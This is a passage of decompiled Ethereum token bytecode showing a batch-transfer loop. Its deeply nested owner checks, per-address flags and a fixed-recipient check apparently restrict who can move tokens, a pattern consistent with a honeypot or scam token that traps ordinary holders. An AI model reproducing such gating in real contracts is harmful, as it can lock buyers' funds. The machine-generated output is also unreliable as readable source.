                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _792 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_792] = 38
                                        mem[_792 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _610 > balanceOf[address(msg.sender)]:
                                            _874 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_874 + idx + 68] = mem[_792 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_874 + 100] = mem[_874 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _874 + -mem[64] + 132
                                    else:
                                        stor2[address(msg.sender)] = 1
                                        mem[0] = msg.sender
                                        mem[32] = 1
                                        stor1[address(msg.sender)] = 0
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _832 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_832] = 38
                                        mem[_832 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _610 > balanceOf[address(msg.sender)]:
                                            _930 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_930 + idx + 68] = mem[_832 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_930 + 100] = mem[_930 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _930 + -mem[64] + 132
        else:
            if msg.sender == _owner:
                stor11 = mem[(32 * idx) + 140 len 20]
                if not msg.sender:
                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                if not mem[(32 * idx) + 140 len 20]:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                _616 = mem[64]
                mem[64] = mem[64] + 96
                mem[_616] = 38
                mem[_616 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                mem[32] = 0
                if _610 > balanceOf[address(msg.sender)]:
                    _627 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 38
                    idx = 0
                    while idx < 38:
                        mem[_627 + idx + 68] = mem[_616 + idx + 32]
                        idx = idx + 32
                        continue 
                    mem[_627 + 100] = mem[_627 + 126 len 6]
                    revert with memory
                      from mem[64]
                       len _627 + -mem[64] + 132
            else:
                if msg.sender == stor11:
                    if _owner != msg.sender:
                        if not msg.sender:
                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                        if not mem[(32 * idx) + 140 len 20]:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                        _721 = mem[64]
                        mem[64] = mem[64] + 96
                        mem[_721] = 38
                        mem[_721 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                        mem[32] = 0
                        if _610 > balanceOf[address(msg.sender)]:
                            _803 = mem[64]
                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                            mem[mem[64] + 4] = 32
                            mem[mem[64] + 36] = 38
                            idx = 0
                            while idx < 38:
                                mem[_803 + idx + 68] = mem[_721 + idx + 32]
                                idx = idx + 32
                                continue 
                            mem[_803 + 100] = mem[_803 + 126 len 6]
                            revert with memory
                              from mem[64]
                               len _803 + -mem[64] + 132
                    else:
                        if mem[(32 * idx) + 140 len 20] != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _762 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_762] = 38
                            mem[_762 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _610 > balanceOf[address(msg.sender)]:
                                _844 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_844 + idx + 68] = mem[_762 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_844 + 100] = mem[_844 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _844 + -mem[64] + 132
                        else:
                            stor3 = mem[(32 * idx) + (32 * arg1.length) + 160]
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _806 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_806] = 38
                            mem[_806 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _610 > balanceOf[address(msg.sender)]:
                                _893 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_893 + idx + 68] = mem[_806 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_893 + 100] = mem[_893 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _893 + -mem[64] + 132
                else:
                    if mem[(32 * idx) + 140 len 20] == _owner:
                        if _owner != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _776 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_776] = 38
                            mem[_776 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _610 > balanceOf[address(msg.sender)]:
                                _855 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_855 + idx + 68] = mem[_776 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_855 + 100] = mem[_855 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _855 + -mem[64] + 132
                        else:
                            if mem[(32 * idx) + 140 len 20] != msg.sender:
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _819 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_819] = 38
                                mem[_819 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _610 > balanceOf[address(msg.sender)]:
                                    _905 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[_905 + idx + 68] = mem[_819 + idx + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_905 + 100] = mem[_905 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _905 + -mem[64] + 132
                            else:
                                stor3 = mem[(32 * idx) + (32 * arg1.length) + 160]
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _858 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_858] = 38
                                mem[_858 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _610 > balanceOf[address(msg.sender)]:
                                    _971 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[_971 + idx + 68] = mem[_858 + idx + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_971 + 100] = mem[_971 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _971 + -mem[64] + 132
                    else:
                        mem[0] = msg.sender
                        mem[32] = 1
                        if bool(stor1[address(msg.sender)]) == 1:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _731 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_731] = 38
                            mem[_731 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _610 > balanceOf[address(msg.sender)]:
                                _816 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_816 + idx + 68] = mem[_731 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_816 + 100] = mem[_816 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _816 + -mem[64] + 132
                        else:
                            mem[0] = msg.sender
                            mem[32] = 2
                            if bool(stor2[address(msg.sender)]) == 1:
                                if msg.sender == stor11:
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _851 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_851] = 38
                                    mem[_851 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _610 > balanceOf[address(msg.sender)]:
                                        _961 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[_961 + idx + 68] = mem[_851 + idx + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_961 + 100] = mem[_961 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _961 + -mem[64] + 132
                                else:
                                    if mem[(32 * idx) + 140 len 20] != stor12:
                                        revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _900 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_900] = 38
                                    mem[_900 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _610 > balanceOf[address(msg.sender)]:
                                        _1025 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[_1025 + idx + 68] = mem[_900 + idx + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_1025 + 100] = mem[_1025 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _1025 + -mem[64] + 132
                            else:
                                if mem[(32 * idx) + (32 * arg1.length) + 160] >= stor3:
                                    if msg.sender == stor11:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _896 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_896] = 38
                                        mem[_896 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _610 > balanceOf[address(msg.sender)]:
                                            _1015 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1015 + idx + 68] = mem[_896 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1015 + 100] = mem[_1015 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1015 + -mem[64] + 132
                                    else:
                                        if mem[(32 * idx) + 140 len 20] != stor12:
                                            revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _956 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_956] = 38
                                        mem[_956 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _610 > balanceOf[address(msg.sender)]:
                                            _1074 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1074 + idx + 68] = mem[_956 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1074 + 100] = mem[_1074 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1074 + -mem[64] + 132
                                else:
                                    if mem[(32 * idx) + 140 len 20] != stor11:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _849 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_849] = 38
                                        mem[_849 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _610 > balanceOf[address(msg.sender)]:
                                            _958 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_958 + idx + 68] = mem[_849 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_958 + 100] = mem[_958 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _958 + -mem[64] + 132
                                    else:
                                        stor2[address(msg.sender)] = 1
                                        mem[0] = msg.sender
                                        mem[32] = 1
                                        stor1[address(msg.sender)] = 0
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _898 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_898] = 38
                                        mem[_898 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _610 > balanceOf[address(msg.sender)]:
                                            _1020 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1020 + idx + 68] = mem[_898 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1020 + 100] = mem[_1020 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1020 + -mem[64] + 132
        ('le', ('var', '_610'), ('stor', ('map', ('mask_shl', 160, 0, 0, 'msg.sender'), ('name', 'balanceOf', 0))))
        balanceOf[address(msg.sender)] -= _610
        if balanceOf[address(_608)] + _610 < balanceOf[address(_608)]:
            revert with 0, 'SafeMath: addition overflow'
        mem[0] = address(_608)
        mem[32] = 0
        balanceOf[address(_608)] += _610
        mem[mem[64]] = _610
        emit Transfer(_610, msg.sender, address(_608));
        idx = idx + 1
        continue 
}



}
